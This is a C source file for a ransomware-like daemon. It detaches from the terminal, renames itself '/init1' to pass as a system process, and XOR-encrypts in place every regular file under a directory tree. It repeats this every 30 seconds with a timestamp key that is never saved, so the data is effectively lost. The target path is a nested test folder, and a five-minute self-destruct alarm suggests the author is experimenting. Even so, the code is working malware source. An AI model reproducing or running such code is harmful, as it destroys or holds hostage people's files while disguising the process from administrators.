#define _DEFAULT_SOURCE
#define _BSD_SOURCE
#define _XOPEN_SOURCE 700
#include <dirent.h>
#include <stdio.h> 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <syslog.h>
#include <signal.h>
#include <time.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>

// function: alarm self destruct
void selfDestruct(int sig) {
  printf("Self-destructing...\n");
  exit(0);
}

// function: encrypt files using XOR cipher
void xor_encrypt(const char *input_path, int key) {
  FILE *input_file = fopen(input_path, "rb+");
  if (!input_file) { // check: file open failure
    perror("Failed to open input file");
    return;
  }

  int ch; 
  while ((ch = fgetc(input_file)) != EOF) {
    fseek(input_file, -1, SEEK_CUR);
    fputc(ch ^ key, input_file);
    fflush(input_file);
  }

  fclose(input_file);
}

// function: encrypt directory and its contents
void encrypt_dir(const char *path, int key) {
  DIR *dir = opendir(path);
  if (!dir) {
    perror("Failed to open directory");
    return;
  }

  struct dirent *entry;
  while ((entry = readdir(dir)) != NULL) {
    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
      continue; // Skip current and parent directories
    }

    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

    if (entry->d_type == DT_DIR) {
      // If it's a directory, recursively encrypt it
      encrypt_dir(full_path, key);
    } else if (entry->d_type == DT_REG) {
      // If it's a regular file, encrypt it
      xor_encrypt(full_path, key);
    }

  }
  closedir(dir);
}

// main function to create a daemon process
int main(int argc, char *argv[]) {
  // changing the command name
  strncpy(argv[0], "/init1", 50);
  argv[0][50] = '\0'; // ensure null termination

  // declaration: id process
  pid_t pid, sid; 
  pid = fork();
  if (pid < 0) { // check: fork failure
  exit(EXIT_FAILURE);
  }

  if (pid > 0) { // check: fork parent success
  exit(EXIT_SUCCESS);
  }

  // allowing the child to run in the background
  umask(0);

  // separate from terminal 
  sid = setsid();
  if (sid < 0) { // check: setsid failure
  exit(EXIT_FAILURE);
  }

  // change working directory
  if ((chdir("/")) < 0) {
  exit(EXIT_FAILURE);
  }

  // close standard file descriptors
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);

  // process name changed in kernel
  prctl(PR_SET_NAME, "/init1", NULL, NULL, NULL);

  // safety measure
  // process running limitation
  /* int max_runs = 5;
  int current_run = 0;
  while (current_run < max_runs) {
    current_run++;
    sleep(30);
  } */

  // file: daemon pid
  FILE *pid_file = fopen("/tmp/daemon.pid", "w");
  if (pid_file == NULL) {
    perror("Failed to open pid file");
    exit(EXIT_FAILURE);
  }
  fprintf(pid_file, "%d", getpid());
  fclose(pid_file);

  // file: daemon log
  FILE *log_file = fopen("/tmp/daemon.log", "a");
  if (log_file == NULL) {
    perror("Failed to open log file");
    exit(EXIT_FAILURE);
  }
  fprintf(log_file, "Daemon started with PID: %d\n", getpid());
  
  // alarm signal safety measure
  signal(SIGALRM, selfDestruct);
  alarm(300); // Set alarm for 5 minutes
  

  // daemon process loop
  while (1) {
    // timestamp-based encryption
    time_t timestamp = time(NULL); // Get current time
    encrypt_dir("/home/user/testingPurposesOnly/parentTest/childTest/anotherTest/justToBeSafe/makingSureYouKnow/cantTouchThis/test/forRealTest/likeReallyTestingIt/FiraCode", (int)timestamp);
    
    // append to log file
    fprintf(log_file, "Encryption performed at %ld\n", timestamp);
    fflush(log_file);

    // sleep for 30 seconds
    sleep(30);
  }
  
  // close log file
  fclose(log_file);
  return 0;
}